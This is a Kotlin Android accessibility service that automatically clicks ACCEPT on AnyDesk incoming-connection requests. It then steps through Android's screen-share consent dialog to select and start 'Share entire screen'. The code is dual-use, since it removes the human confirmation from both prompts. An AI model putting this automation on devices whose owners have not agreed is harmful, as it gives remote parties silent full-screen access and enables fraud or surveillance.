package com.azamovme.anydeskhelper

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.graphics.Rect
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicInteger

class AnyDeskAccessibilityService : AccessibilityService() {

    companion object {
        const val TAG = "AnyDeskHelper"
        var isServiceEnabled = false

        // Package names
        private const val ANYDESK_PACKAGE = "com.anydesk.anydeskandroid"
        private const val SYSTEMUI_PACKAGE = "com.android.systemui"

        // AnyDesk dialog IDs
        private const val DIALOG_TITLE_ID = "com.anydesk.anydeskandroid:id/dialog_accept_title_text"
        private const val DIALOG_MSG_ID = "com.anydesk.anydeskandroid:id/dialog_accept_msg"
        private const val PERMISSION_PROFILE_ID = "com.anydesk.anydeskandroid:id/dialog_accept_profiles_list"
        private const val PERMISSIONS_TITLE_ID = "com.anydesk.anydeskandroid:id/dialog_accept_permissions_title"
        private const val ACCEPT_BUTTON_ID = "android:id/button1"
        private const val DISMISS_BUTTON_ID = "android:id/button2"
        private const val ADDRESS_TEXT_ID = "com.anydesk.anydeskandroid:id/dialog_accept_address"
        private const val ALIAS_TEXT_ID = "com.anydesk.anydeskandroid:id/dialog_accept_alias"
        private const val PERMISSIONS_CONTAINER_ID = "com.anydesk.anydeskandroid:id/dialog_accept_permissions_container"

        // SystemUI Share Screen dialog IDs
        private const val SHARE_SCREEN_DIALOG_ID = "com.android.systemui:id/screen_share_permission_dialog"
        private const val SHARE_SCREEN_TITLE_ID = "com.android.systemui:id/screen_share_dialog_title"
        private const val SHARE_SCREEN_MODE_OPTIONS_ID = "com.android.systemui:id/screen_share_mode_options"
        private const val SHARE_SCREEN_NEXT_BUTTON_ID = "android:id/button1"
        private const val SHARE_SCREEN_CANCEL_BUTTON_ID = "android:id/button2"

        // Share chooser IDs
        private const val SHARE_CHOOSER_TEXT_ID = "android:id/text1"
    }

    private val handler = Handler(Looper.getMainLooper())
    private val coroutineScope = CoroutineScope(Dispatchers.IO)
    private var isProcessing = false
    private var lastProcessTime = 0L
    private val MIN_PROCESS_INTERVAL = 800L

    // Status monitoring
    private var dialogDetectedCount = 0
    private var autoAcceptCount = 0
    private var screenShareProcessed = false
    private var currentStep = AtomicInteger(0)

    // State management
    private var lastActivityTime = System.currentTimeMillis()
    private val STATE_TIMEOUT = 30000L // 30 seconds

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "🟢 Accessibility Service Connected")
        isServiceEnabled = true

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            packageNames = arrayOf(ANYDESK_PACKAGE, SYSTEMUI_PACKAGE)
            notificationTimeout = 100
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }

        this.serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        if (packageName != ANYDESK_PACKAGE && packageName != SYSTEMUI_PACKAGE) {
            return
        }

        // Check for timeout reset
        checkTimeoutReset()

        val currentTime = System.currentTimeMillis()
        if (currentTime - lastProcessTime < MIN_PROCESS_INTERVAL) {
            return
        }

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Log.d(TAG, "📱 Window changed: $packageName, Step: ${currentStep.get()}")
            lastProcessTime = currentTime
            lastActivityTime = currentTime

            handler.removeCallbacksAndMessages(null)
            handler.postDelayed({
                when (packageName) {
                    ANYDESK_PACKAGE -> {
                        if (currentStep.get() == 0) {
                            processAnyDeskWindow()
                        }
                    }
                    SYSTEMUI_PACKAGE -> {
                        processSystemUIWindow()
                    }
                }
            }, 400)
        }
    }

    private fun processAnyDeskWindow() {
        if (isProcessing) return

        isProcessing = true
        coroutineScope.launch {
            try {
                delay(300)
                val rootNode = rootInActiveWindow ?: run {
                    isProcessing = false
                    return@launch
                }

                if (detectIncomingDialog(rootNode)) {
                    dialogDetectedCount++
                    Log.d(TAG, "✅ AnyDesk dialog detected! Count: $dialogDetectedCount")

                    if (currentStep.get() == 0) {
                        val accepted = performAutoAccept(rootNode)
                        if (accepted) {
                            Log.d(TAG, "✅ AnyDesk accept successful")
                            currentStep.set(1)
                            lastActivityTime = System.currentTimeMillis()
                        }
                    }
                }

                safeRecycle(rootNode)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error in AnyDesk window", e)
            } finally {
                isProcessing = false
            }
        }
    }

    private fun processSystemUIWindow() {
        if (isProcessing) return

        isProcessing = true
        coroutineScope.launch {
            try {
                delay(500) // Wait for UI to load
                val rootNode = rootInActiveWindow ?: run {
                    isProcessing = false
                    return@launch
                }

                Log.d(TAG, "🔍 Checking SystemUI window, Step: ${currentStep.get()}")

                when (currentStep.get()) {
                    1 -> {
                        // Step 1: Click spinner in main dialog
                        if (handleShareScreenDialog(rootNode)) {
                            Log.d(TAG, "✅ Spinner handling completed")
                            currentStep.set(2)
                            lastActivityTime = System.currentTimeMillis()
                        } else {
                            // Fallback: if spinner not found, try to detect chooser directly
                            if (detectShareChooser(rootNode)) {
                                Log.d(TAG, "🔄 Fallback: Found chooser directly, moving to step 2")
                                currentStep.set(2)
                                lastActivityTime = System.currentTimeMillis()
                                handler.postDelayed({
                                    processSystemUIWindow()
                                }, 500)
                            }
                        }
                    }
                    2 -> {
                        // Step 2: Handle chooser dialog
                        if (detectShareChooser(rootNode)) {
                            Log.d(TAG, "✅ Chooser dialog detected")
                            if (handleShareChooser(rootNode)) {
                                Log.d(TAG, "✅ Chooser handling completed")
                                currentStep.set(3)
                                lastActivityTime = System.currentTimeMillis()

                                // Wait a bit then process main dialog
                                handler.postDelayed({
                                    processSystemUIWindow()
                                }, 800)
                            }
                        } else {
                            // Chooser not found, maybe already selected or closed
                            Log.d(TAG, "⚠️ Chooser not found, checking if we're back to main dialog")

                            // Check if we're back in main dialog with "Share entire screen" selected
                            if (detectShareScreenDialog(rootNode)) {
                                val spinner = findNodeById(rootNode, SHARE_SCREEN_MODE_OPTIONS_ID)
                                if (spinner != null) {
                                    val spinnerText = getSpinnerText(spinner)
                                    safeRecycle(spinner)

                                    if (spinnerText.contains("entire screen", ignoreCase = true)) {
                                        Log.d(TAG, "✅ Already in main dialog with 'Share entire screen' selected")
                                        currentStep.set(3)
                                        lastActivityTime = System.currentTimeMillis()

                                        // Process share button immediately
                                        handler.postDelayed({
                                            processSystemUIWindow()
                                        }, 500)
                                    }
                                }
                            }
                        }
                    }
                    3 -> {
                        // Step 3: Click Share screen button
                        if (handleShareButton(rootNode)) {
                            Log.d(TAG, "✅ Share button handling completed")
                            currentStep.set(0) // Reset for next connection
                            screenShareProcessed = true
                            lastActivityTime = System.currentTimeMillis()
                            showToastNotification("✅ Screen sharing started")
                        } else {
                            Log.w(TAG, "⚠️ Failed to click share button, retrying...")
                            // Retry after delay
                            handler.postDelayed({
                                if (currentStep.get() == 3) {
                                    processSystemUIWindow()
                                }
                            }, 1000)
                        }
                    }
                }

                safeRecycle(rootNode)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error in SystemUI window", e)
            } finally {
                isProcessing = false
            }
        }
    }

    /**
     * Detect SystemUI Share Screen dialog
     */
    private fun detectShareScreenDialog(rootNode: AccessibilityNodeInfo): Boolean {
        try {
            // 1. Dialog ID bo'yicha tekshirish
            val dialog = findNodeById(rootNode, SHARE_SCREEN_DIALOG_ID)
            if (dialog != null) {
                safeRecycle(dialog)
                Log.d(TAG, "✓ Share screen dialog ID found")
                return true
            }

            // 2. Title bo'yicha tekshirish
            val title = findNodeById(rootNode, SHARE_SCREEN_TITLE_ID)
            if (title != null) {
                val titleText = title.text?.toString()?.trim()
                safeRecycle(title)
                if (titleText?.contains("Share your screen", ignoreCase = true) == true) {
                    Log.d(TAG, "✓ Share screen title found: $titleText")
                    return true
                }
            }

            // 3. Spinner bo'yicha tekshirish
            val spinner = findNodeById(rootNode, SHARE_SCREEN_MODE_OPTIONS_ID)
            if (spinner != null) {
                safeRecycle(spinner)
                Log.d(TAG, "✓ Share screen spinner found")
                return true
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error detecting share screen dialog", e)
        }

        return false
    }

    private fun detectShareChooser(rootNode: AccessibilityNodeInfo): Boolean {
        try {
            // Method 1: Check for both text options
            val entireScreen = rootNode.findAccessibilityNodeInfosByText("Share entire screen")
            val oneApp = rootNode.findAccessibilityNodeInfosByText("Share one app")

            val hasBoth = entireScreen.isNotEmpty() && oneApp.isNotEmpty()

            entireScreen.forEach { safeRecycle(it) }
            oneApp.forEach { safeRecycle(it) }

            if (hasBoth) {
                Log.d(TAG, "✓ Chooser dialog detected by text")
                return true
            }

            // Method 2: Check for ListView with 2 items
            val listViews = rootNode.findAccessibilityNodeInfosByViewId("android.widget.ListView")
            if (listViews.isNotEmpty()) {
                for (listView in listViews) {
                    if (listView.childCount == 2) {
                        var hasShareText = false
                        for (i in 0 until listView.childCount) {
                            val child = listView.getChild(i)
                            if (child != null) {
                                val childText = child.text?.toString()?.trim()
                                if (childText != null &&
                                    (childText.contains("Share", ignoreCase = true))) {
                                    hasShareText = true
                                }
                                safeRecycle(child)
                            }
                        }
                        if (hasShareText) {
                            listViews.forEach { safeRecycle(it) }
                            return true
                        }
                    }
                }
                listViews.forEach { safeRecycle(it) }
            }

            // Method 3: Traverse and look for specific bounds
            val chooserNodes = mutableListOf<AccessibilityNodeInfo>()
            traverseNodes(rootNode) { node ->
                try {
                    // Get bounds safely
                    val bounds = Rect()
                    node.getBoundsInScreen(bounds)

                    // Check for chooser bounds [89,1021][991,1399]
                    if (bounds.left == 89 && bounds.top == 1021 &&
                        bounds.right == 991 && bounds.bottom == 1399) {
                        chooserNodes.add(node)
                    }
                } catch (e: Exception) {
                    // Ignore bounds errors
                }
                false // continue traversal
            }

            if (chooserNodes.isNotEmpty()) {
                chooserNodes.forEach { safeRecycle(it) }
                Log.d(TAG, "✓ Chooser detected by bounds")
                return true
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error detecting share chooser", e)
        }

        return false
    }

    /**
     * Step 1: Handle main share screen dialog - click spinner
     */
    private fun handleShareScreenDialog(rootNode: AccessibilityNodeInfo): Boolean {
        try {
            Log.d(TAG, "🎯 Step 1: Looking for share screen spinner...")

            // First, verify it's the main dialog
            val dialog = findNodeById(rootNode, SHARE_SCREEN_DIALOG_ID)
            if (dialog == null) {
                Log.d(TAG, "⚠️ Main share dialog not found")
                return false
            }
            safeRecycle(dialog)

            // Find and click the spinner
            val spinner = findNodeById(rootNode, SHARE_SCREEN_MODE_OPTIONS_ID)
            if (spinner != null && spinner.isClickable) {
                Log.d(TAG, "✓ Found spinner, clicking...")

                // Get current text for logging
                val spinnerText = getSpinnerText(spinner)
                Log.d(TAG, "Spinner text: $spinnerText")

                if (performClick(spinner)) {
                    Log.d(TAG, "✅ Spinner clicked successfully")

                    // Wait for chooser to open
                    handler.postDelayed({
                        Log.d(TAG, "⏳ Waiting for chooser...")
                    }, 500)
                    return true
                } else {
                    Log.w(TAG, "⚠️ Failed to click spinner")
                }
                safeRecycle(spinner)
            } else {
                Log.w(TAG, "⚠️ Spinner not found or not clickable")
                safeRecycle(spinner)
            }

            // Alternative: Try to find spinner by traversal
            Log.d(TAG, "🔄 Trying alternative spinner search...")
            val foundSpinner = findSpinnerByTraversal(rootNode)
            if (foundSpinner != null) {
                Log.d(TAG, "✓ Found spinner via traversal, clicking...")
                if (performClick(foundSpinner)) {
                    Log.d(TAG, "✅ Spinner clicked via traversal")
                    safeRecycle(foundSpinner)
                    return true
                }
                safeRecycle(foundSpinner)
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in handleShareScreenDialog", e)
        }

        return false
    }

    /**
     * Get text from spinner
     */
    private fun getSpinnerText(spinner: AccessibilityNodeInfo): String {
        return try {
            for (i in 0 until spinner.childCount) {
                val child = spinner.getChild(i)
                if (child != null) {
                    val text = child.text?.toString()?.trim()
                    if (!text.isNullOrEmpty()) {
                        safeRecycle(child)
                        return text
                    }
                    safeRecycle(child)
                }
            }
            "No text found"
        } catch (e: Exception) {
            "Error getting text"
        }
    }

    /**
     * Find spinner by traversal
     */
    private fun findSpinnerByTraversal(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return findNodeByTraversal(rootNode) { node ->
            node.className?.contains("Spinner", ignoreCase = true) == true &&
                    node.isClickable && node.isEnabled
        }
    }

    /**
     * Step 2: Handle chooser dialog - select "Share entire screen"
     */
    private fun handleShareChooser(rootNode: AccessibilityNodeInfo): Boolean {
        try {
            Log.d(TAG, "🎯 Step 2: Handling chooser dialog...")

            // Find "Share entire screen" option using multiple methods
            val entireScreenOption = findShareEntireScreenOption(rootNode)
            if (entireScreenOption != null) {
                Log.d(TAG, "✓ Found 'Share entire screen' option, clicking...")

                // Log the node details for debugging
                Log.d(TAG, "Node details - Class: ${entireScreenOption.className}, " +
                        "Clickable: ${entireScreenOption.isClickable}, " +
                        "Enabled: ${entireScreenOption.isEnabled}")

                if (performClick(entireScreenOption)) {
                    Log.d(TAG, "✅ 'Share entire screen' selected")
                    safeRecycle(entireScreenOption)
                    return true
                } else {
                    Log.w(TAG, "⚠️ Failed to click 'Share entire screen', trying alternative methods")

                    // Try alternative click methods
                    if (performAlternativeClick(entireScreenOption)) {
                        Log.d(TAG, "✅ 'Share entire screen' selected via alternative click")
                        safeRecycle(entireScreenOption)
                        return true
                    }
                }
                safeRecycle(entireScreenOption)
            } else {
                Log.w(TAG, "⚠️ 'Share entire screen' option not found in chooser")

                // Try to find by coordinates (bounds from hierarchy)
                val optionByBounds = findOptionByBounds(rootNode, 89, 1210, 991, 1399)
                if (optionByBounds != null && optionByBounds.isClickable) {
                    Log.d(TAG, "✓ Found option by bounds, clicking...")
                    if (performClick(optionByBounds)) {
                        Log.d(TAG, "✅ Option clicked by bounds")
                        safeRecycle(optionByBounds)
                        return true
                    }
                    safeRecycle(optionByBounds)
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in handleShareChooser", e)
        }

        return false
    }

    private fun findShareEntireScreenOption(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        try {
            // Method 1: Find by text and get clickable parent
            val nodes = rootNode.findAccessibilityNodeInfosByText("Share entire screen")
            for (node in nodes) {
                // Look for clickable parent (LinearLayout)
                var target: AccessibilityNodeInfo? = node
                var parent = node.parent

                while (parent != null && target != null && !target.isClickable) {
                    safeRecycle(target)
                    target = parent
                    parent = parent.parent
                }

                if (target != null && target.isClickable) {
                    // Recycle other nodes
                    nodes.forEach { if (it != node) safeRecycle(it) }
                    return target
                }
                safeRecycle(target)
            }
            nodes.forEach { safeRecycle(it) }

            // Method 2: Find LinearLayout with text child containing "Share entire screen"
            val linearLayouts = rootNode.findAccessibilityNodeInfosByViewId("android.widget.LinearLayout")
            for (layout in linearLayouts) {
                if (layout.isClickable) {
                    // Check children for the text
                    for (i in 0 until layout.childCount) {
                        val child = layout.getChild(i)
                        if (child != null) {
                            val text = child.text?.toString()?.trim()
                            if (text != null && text.contains("Share entire screen", ignoreCase = true)) {
                                linearLayouts.forEach { if (it != layout) safeRecycle(it) }
                                safeRecycle(child)
                                return layout
                            }
                            safeRecycle(child)
                        }
                    }
                }
            }
            linearLayouts.forEach { safeRecycle(it) }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error finding share entire screen", e)
        }

        return null
    }

    private fun findOptionByBounds(rootNode: AccessibilityNodeInfo, left: Int, top: Int, right: Int, bottom: Int): AccessibilityNodeInfo? {
        return findNodeByTraversal(rootNode) { node ->
            try {
                val bounds = Rect()
                node.getBoundsInScreen(bounds)
                bounds.left == left && bounds.top == top &&
                        bounds.right == right && bounds.bottom == bottom &&
                        node.isClickable
            } catch (e: Exception) {
                false
            }
        }
    }

    /**
     * Step 3: Handle share button in main dialog
     */
    private fun handleShareButton(rootNode: AccessibilityNodeInfo): Boolean {
        try {
            Log.d(TAG, "🎯 Step 3: Looking for 'Share screen' button...")

            // Check spinner text to confirm "Share entire screen" is selected
            val spinner = findNodeById(rootNode, SHARE_SCREEN_MODE_OPTIONS_ID)
            if (spinner != null) {
                val spinnerText = getSpinnerText(spinner)
                Log.d(TAG, "Current spinner text: $spinnerText")
                safeRecycle(spinner)

                if (!spinnerText.contains("entire screen", ignoreCase = true)) {
                    Log.w(TAG, "⚠️ Spinner doesn't show 'Share entire screen', current: $spinnerText")
                    return false
                }
            }

            // Find and click the "Share screen" button using multiple methods
            val shareButton = findShareScreenButton(rootNode)
            if (shareButton != null) {
                Log.d(TAG, "✓ Found 'Share screen' button, clicking...")
                if (performClick(shareButton)) {
                    Log.d(TAG, "✅ 'Share screen' button clicked successfully")
                    safeRecycle(shareButton)
                    return true
                } else {
                    Log.w(TAG, "⚠️ Failed to click 'Share screen' button, trying alternative...")

                    // Try alternative click
                    if (performAlternativeClick(shareButton)) {
                        Log.d(TAG, "✅ 'Share screen' button clicked via alternative")
                        safeRecycle(shareButton)
                        return true
                    }
                }
                safeRecycle(shareButton)
            } else {
                Log.w(TAG, "⚠️ 'Share screen' button not found")

                // Try to find by bounds from hierarchy
                val buttonByBounds = findNodeByTraversal(rootNode) { node ->
                    try {
                        node.className?.contains("Button") == true &&
                                node.isClickable
                    } catch (e: Exception) {
                        false
                    }
                }

                if (buttonByBounds != null) {
                    Log.d(TAG, "✓ Found button by traversal, clicking...")
                    if (performClick(buttonByBounds)) {
                        Log.d(TAG, "✅ Button clicked")
                        safeRecycle(buttonByBounds)
                        return true
                    }
                    safeRecycle(buttonByBounds)
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in handleShareButton", e)
        }

        return false
    }

    private fun findShareScreenButton(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        try {
            // Method 1: Find by ID
            val button = findNodeById(rootNode, SHARE_SCREEN_NEXT_BUTTON_ID)
            if (button != null && button.isClickable) {
                val text = button.text?.toString()?.trim()
                if (text.equals("Share screen", ignoreCase = true) ||
                    text.equals("Share", ignoreCase = true) ||
                    text.equals("Start", ignoreCase = true)) {
                    return button
                }
                safeRecycle(button)
            }

            // Method 2: Find by text
            val buttons = rootNode.findAccessibilityNodeInfosByText("Share screen")
            for (btn in buttons) {
                if (btn.isClickable && btn.className?.contains("Button") == true) {
                    val text = btn.text?.toString()?.trim()
                    if (text.equals("Share screen", ignoreCase = true)) {
                        buttons.forEach { if (it != btn) safeRecycle(it) }
                        return btn
                    }
                }
            }
            buttons.forEach { safeRecycle(it) }

            // Method 3: Find any button with "Share" text
            val shareButtons = rootNode.findAccessibilityNodeInfosByText("Share")
            for (btn in shareButtons) {
                if (btn.isClickable && btn.className?.contains("Button") == true) {
                    shareButtons.forEach { if (it != btn) safeRecycle(it) }
                    return btn
                }
            }
            shareButtons.forEach { safeRecycle(it) }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error finding share button", e)
        }

        return null
    }

    /**
     * Check timeout and reset state if needed
     */
    private fun checkTimeoutReset() {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastActivityTime > STATE_TIMEOUT) {
            Log.d(TAG, "🔄 Resetting state due to timeout (${STATE_TIMEOUT/1000}s)")
            currentStep.set(0)
            screenShareProcessed = false
            lastActivityTime = currentTime
        }
    }

    private fun detectIncomingDialog(rootNode: AccessibilityNodeInfo): Boolean {
        var evidenceCount = 0

        try {
            // Title check
            val title = findNodeById(rootNode, DIALOG_TITLE_ID)
            if (title != null) {
                val titleText = title.text?.toString()?.trim()
                if (titleText.equals("Incoming connection request", ignoreCase = true) ||
                    titleText.equals("Incoming session", ignoreCase = true) ||
                    titleText?.contains("incoming", ignoreCase = true) == true) {
                    evidenceCount += 2
                    Log.d(TAG, "✓ Title matched: $titleText")
                }
                safeRecycle(title)
            }

            // Message check
            val message = findNodeById(rootNode, DIALOG_MSG_ID)
            if (message != null) {
                val messageText = message.text?.toString()?.trim()
                if (messageText?.contains("would like to", ignoreCase = true) == true ||
                    messageText?.contains("view your desk", ignoreCase = true) == true ||
                    messageText?.contains("connect to", ignoreCase = true) == true) {
                    evidenceCount += 2
                    Log.d(TAG, "✓ Message pattern found")
                }
                safeRecycle(message)
            }

            // Address/Alias fields
            val address = findNodeById(rootNode, ADDRESS_TEXT_ID)
            val alias = findNodeById(rootNode, ALIAS_TEXT_ID)
            if (address != null || alias != null) {
                evidenceCount++
                Log.d(TAG, "✓ Address/Alias field found")
                safeRecycle(address)
                safeRecycle(alias)
            }

            // Permissions section
            val permissionsTitle = findNodeById(rootNode, PERMISSIONS_TITLE_ID)
            val permissionsContainer = findNodeById(rootNode, PERMISSIONS_CONTAINER_ID)
            if (permissionsTitle != null || permissionsContainer != null) {
                evidenceCount++
                Log.d(TAG, "✓ Permissions section found")
                safeRecycle(permissionsTitle)
                safeRecycle(permissionsContainer)
            }

            // ACCEPT and DISMISS buttons
            val acceptButton = findAcceptButton(rootNode)
            val dismissButton = findDismissButton(rootNode)
            if (acceptButton != null && dismissButton != null) {
                evidenceCount += 3
                Log.d(TAG, "✓ Both ACCEPT and DISMISS buttons found")
                safeRecycle(acceptButton)
                safeRecycle(dismissButton)
            } else {
                safeRecycle(acceptButton)
                safeRecycle(dismissButton)
            }

            // Spinner (Permission profile)
            val spinner = findNodeById(rootNode, PERMISSION_PROFILE_ID)
            if (spinner != null) {
                evidenceCount++
                Log.d(TAG, "✓ Permission spinner found")
                safeRecycle(spinner)
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in dialog detection", e)
        }

        val detected = evidenceCount >= 4
        if (detected) {
            Log.d(TAG, "✅ Dialog confirmed with $evidenceCount evidence points")
        }

        return detected
    }

    private fun performAutoAccept(rootNode: AccessibilityNodeInfo): Boolean {
        try {
            Log.d(TAG, "🎯 Starting auto-accept...")

            val acceptButton = findAcceptButton(rootNode)
            if (acceptButton != null) {
                autoAcceptCount++
                Log.d(TAG, "🎯 Found ACCEPT button! Clicking... Total accepted: $autoAcceptCount")

                if (performClick(acceptButton)) {
                    Log.d(TAG, "✅ ACCEPT button clicked successfully!")
                    showToastNotification("✅ Connection accepted")
                    safeRecycle(acceptButton)
                    return true
                } else {
                    Log.w(TAG, "⚠️ ACCEPT button click failed")
                }
                safeRecycle(acceptButton)
            } else {
                Log.w(TAG, "⚠️ ACCEPT button not found")
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in auto-accept", e)
        }

        return false
    }

    private fun findAcceptButton(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        // By resource ID
        val byId = findNodeById(rootNode, ACCEPT_BUTTON_ID)
        if (byId != null && byId.isClickable && byId.isEnabled) {
            val text = byId.text?.toString()?.trim()
            if (text.equals("ACCEPT", ignoreCase = true) ||
                text.equals("ALLOW", ignoreCase = true) ||
                text.equals("OK", ignoreCase = true)) {
                return byId
            }
            safeRecycle(byId)
        }

        // By text
        val buttons = rootNode.findAccessibilityNodeInfosByText("ACCEPT")
        for (button in buttons) {
            if (button.isClickable && button.isEnabled) {
                val text = button.text?.toString()?.trim()
                if (text.equals("ACCEPT", ignoreCase = true)) {
                    buttons.forEach { if (it != button) safeRecycle(it) }
                    return button
                }
            }
        }
        buttons.forEach { safeRecycle(it) }

        return null
    }

    private fun findDismissButton(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val byId = findNodeById(rootNode, DISMISS_BUTTON_ID)
        if (byId != null && byId.isClickable && byId.isEnabled) {
            val text = byId.text?.toString()?.trim()
            if (text.equals("DISMISS", ignoreCase = true) ||
                text.equals("DENY", ignoreCase = true) ||
                text.equals("CANCEL", ignoreCase = true)) {
                return byId
            }
            safeRecycle(byId)
        }

        return null
    }

    private fun findNodeById(rootNode: AccessibilityNodeInfo, id: String): AccessibilityNodeInfo? {
        return try {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
            if (nodes.isNotEmpty()) {
                val node = nodes[0]
                for (i in 1 until nodes.size) {
                    safeRecycle(nodes[i])
                }
                return node
            }
            nodes.forEach { safeRecycle(it) }
            null
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error finding node by ID: $id", e)
            null
        }
    }

    private fun performClick(node: AccessibilityNodeInfo): Boolean {
        return try {
            Log.d(TAG, "🖱️ Clicking: ${node.className}, text: ${node.text}")

            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.d(TAG, "✓ Click successful")
                return true
            }

            // Try with focus first
            if (node.performAction(AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS)) {
                Thread.sleep(50)
                if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.d(TAG, "✓ Click via focus successful")
                    return true
                }
            }

            Log.w(TAG, "⚠️ All click methods failed")
            false
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error performing click", e)
            false
        }
    }

    private fun performAlternativeClick(node: AccessibilityNodeInfo): Boolean {
        return try {
            Log.d(TAG, "🔄 Trying alternative click methods...")

            // Method 1: Try long click
            if (node.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK)) {
                Log.d(TAG, "✓ Long click successful")
                return true
            }

            // Method 2: Try accessibility focus and click
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                if (node.performAction(AccessibilityNodeInfo.ACTION_FOCUS)) {
                    Thread.sleep(100)
                    if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.d(TAG, "✓ Focus + click successful")
                        return true
                    }
                }
            }

            // Method 3: Try to get parent and click
            val parent = node.parent
            if (parent != null && parent.isClickable) {
                Log.d(TAG, "🔄 Trying to click parent instead...")
                if (performClick(parent)) {
                    safeRecycle(parent)
                    return true
                }
                safeRecycle(parent)
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in alternative click", e)
            false
        }
    }

    private fun findNodeByTraversal(
        rootNode: AccessibilityNodeInfo,
        predicate: (AccessibilityNodeInfo) -> Boolean
    ): AccessibilityNodeInfo? {
        val queue = mutableListOf<AccessibilityNodeInfo>()
        queue.add(rootNode)

        while (queue.isNotEmpty()) {
            val current = queue.removeAt(0)

            try {
                if (predicate(current)) {
                    // Recycle remaining nodes in queue
                    queue.forEach { if (it != current) safeRecycle(it) }
                    return current
                }

                // Add children
                for (i in 0 until current.childCount) {
                    val child = current.getChild(i)
                    if (child != null) {
                        queue.add(child)
                    }
                }

                // Don't recycle root node here
                if (current != rootNode) {
                    safeRecycle(current)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in traversal", e)
            }
        }

        return null
    }

    private fun traverseNodes(
        rootNode: AccessibilityNodeInfo,
        action: (AccessibilityNodeInfo) -> Boolean
    ) {
        val queue = mutableListOf<AccessibilityNodeInfo>()
        queue.add(rootNode)

        while (queue.isNotEmpty()) {
            val current = queue.removeAt(0)

            try {
                val shouldStop = action(current)
                if (shouldStop) {
                    queue.forEach { safeRecycle(it) }
                    safeRecycle(current)
                    return
                }

                // Add children
                for (i in 0 until current.childCount) {
                    val child = current.getChild(i)
                    if (child != null) {
                        queue.add(child)
                    }
                }

                // Don't recycle root node here
                if (current != rootNode) {
                    safeRecycle(current)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in traversal", e)
            }
        }
    }

    private fun safeRecycle(node: AccessibilityNodeInfo?) {
        if (node == null) return

        try {
            node.recycle()
        } catch (e: Exception) {
            // Ignore, node might already be recycled
        }
    }

    private fun showToastNotification(message: String) {
        Log.i(TAG, "📢 $message")
    }

    private fun logStats() {
        Log.i(TAG, "📊 === Stats ===")
        Log.i(TAG, "📊 Dialogs: $dialogDetectedCount")
        Log.i(TAG, "📊 Auto-accepted: $autoAcceptCount")
        Log.i(TAG, "📊 Screen share processed: $screenShareProcessed")
        Log.i(TAG, "📊 Current step: ${currentStep.get()}")
        Log.i(TAG, "📊 =============")
    }

    override fun onInterrupt() {
        Log.d(TAG, "🔴 Service Interrupted")
        isServiceEnabled = false
        handler.removeCallbacksAndMessages(null)
        isProcessing = false
        currentStep.set(0)
        screenShareProcessed = false
        logStats()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        Log.d(TAG, "🔴 Service Unbound")
        isServiceEnabled = false
        handler.removeCallbacksAndMessages(null)
        isProcessing = false
        currentStep.set(0)
        screenShareProcessed = false
        logStats()
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "🔴 Service Destroyed")
        isServiceEnabled = false
        handler.removeCallbacksAndMessages(null)
        isProcessing = false
        currentStep.set(0)
        screenShareProcessed = false
        logStats()
    }
}